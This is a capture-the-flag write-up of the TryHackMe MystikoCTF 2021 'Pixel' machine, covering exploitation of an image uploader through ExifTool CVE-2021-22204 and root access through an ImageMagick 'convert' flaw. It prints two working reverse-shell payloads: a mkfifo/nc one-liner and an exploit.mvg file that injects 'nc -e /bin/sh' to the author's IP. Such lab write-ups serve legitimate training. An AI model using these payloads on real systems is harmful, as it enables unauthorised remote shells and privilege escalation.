<img src="Screenshots/photo_2021-02-10_22-58-30.jpg" style="margin-left: 300px; zoom: 30%;" /> 

<font size="8" color="green">MystikoCTF 2021</font>

<font size="3" color="grey">Date: 21<sup>st</sup> / 22<sup>nd</sup> November 2021</font> 

<font size="3" color="white">Description:</font>

> This is my writeup for the recent ctf hosted by Mystiko, the CTF was hosted on TryHackMe and was too much fun, So I would like to thank the team for making this really challenging and also for the great machine.
---

<font size="3" color="white">CTF Name: [MystikoCTF2021](https://tryhackme.com/room/mystikoctf2021)</font>

<font size="3" color="white"> Difficulty: </font><font size="3" color="orange">Medium</font>

<font size="3" color="white">THM Account: [AB2](https://tryhackme.com/p/AB2)</font>

<font size="3" color="white">Email: ab2pentest@tuta.io</font>

<font size="3" color="white">Document Author: [AB2](https://twitter.com/ab2pentest)</font>

<font size="3" color="white">Final ScoreBoard:</font>

<img src="Screenshots/2021-11-22_16-45-37.png"/>

I unfortunately didn't have much time for the CTF, but I ended up sharing the third position with `cryptonic007`.

---

# Enumeration

The CTF had 3 different webapps

> Only PIXEL, DEV01 and DEV02 are in scope for this CTF. Do NOT attack any other IP address or hostname.

So as a start and as usual we should run nmap:

```bash
> nmap -sC -sV 10.10.206.211 -vvv                                             
```
We got 2 opened ports 22 (SSH) and 8080 (Nginx WebServer)

Let's dig into the webserver

<img src="Screenshots/2021-11-22_16-15-23.png"/> 

We have a kind of images uploader, I opened the source page to see if there is anything hidden as comments but there were nothing, and I also confirmed that its accepting only images.

<img src="Screenshots/2021-11-22_16-17-33.png"/>

I had to upload an image and go to burpsuite, to see what going on actually

<img src="Screenshots/2021-11-22_16-21.png"/>

I tried to manipulate the file extension and also the Mime Type with multiple methods but nothing was working, but I eventually noticed something in the response

<img src="Screenshots/2021-11-22_16-22.png"/>

And that was a hidden HTML headings that has some output from the picture I uploaded (mime type,size,image size) and also was starting with a weird `10.61` that looks like a version number !

So I thought probably doing exiftool job, so I had to look for a recent vulnerability of exiftool `CVE-2021-22204` that I had never the chance to try it ... 

# Foothold

I tried multiple public cve's and I eventually ended up with a working one

https://github.com/bilkoh/POC-CVE-2021-22204

Using this command line I was able create the evil picture

<img src="Screenshots/2021-11-22_16-52-54.png"/>

So the picture will download a file `shell.sh` from my attacking webserver and run it

`shell.sh` : 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.2.95.202 9009 >/tmp/f
```

Let's upload the file 

<img src="Screenshots/2021-11-21_13-29-19.png"/>

So after I set my listener and I uploaded the file I succeeded in getting a reverse shell 

<img src="Screenshots/2021-11-22_16-56-09.png"/>

Getting the first flag `local.txt` was pretty easy, the flag was in the home directory of our current user `pixel` and I was able to read it without any restrictions.

<img src="Screenshots/2021-11-21_13-29-07.png"/>

# Privilege Escalation

The first thing I ever do is typing `sudo -l`, to check if there is any commands I can execute with sudo.

<img src="Screenshots/2021-11-21_13-30-34.png"/>

Great ! we have a binary named pixel I copied the binary to my machine for some reversing ...

<img src="Screenshots/2021-11-21_13-31-02.png"/>

I also opened it in ghidra, but nothing was too interesting

<img src="Screenshots/2021-11-22_17-19-53.png"/>

Then I had to run the binary in my machine to see what this thing is doing actually ...

<img src="Screenshots/2021-11-21_13-31-10.png"/>

Kind of an Image Toolkit created by `SIXER` team, I choosed to convert an image to a PDF file and see what will happen ...

<img src="Screenshots/2021-11-21_13-32-36.png"/>

The `Generating PDF` line show us that the binary is using another binary `/usr/local/bin/convert` to convert the image to a PDF file, and I recently just had an experience with the 2016's `convert` exploit, so I quickly go back the Pixel machine and check for the `convert` version

<img src="Screenshots/2021-11-21_13-33-01.png"/>

And yes ! the version was vulnerable, so by google `ImageMagick exploit` you will get a bunch of articles that explains this vulnerability and shows multiple ways to exploit it.

So I went with this steps:

1) Go to `/tmp/` directory.

1) Create a new file `exploit.mvg`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -e "/bin/sh" "10.2.95.202" "9009)'
pop graphic-context
```
<img src="Screenshots/2021-11-21_13-27-19.png"/>

2) Set my listener on port 9009:

  ```
  nc -lvnp 9009
```
3) Run `sudo /usr/bin/pixel` and follow the steps as the image shows (instead of `x.jpg` enter `exploit.mvg`)

<img src="Screenshots/2021-11-21_13-32-36.png"/>

4) Going back to my listener to check if I got a reverse shell:

<img src="Screenshots/2021-11-21_13-35-30.png"/>

And yes ! I was root and able to read the second flag `proof.txt`

<img src="Screenshots/2021-11-22_17-34-28.png"/>

---
Hope you enjoyed my writeup like I enjoyed playing the CTF.

Regards,
AB2.
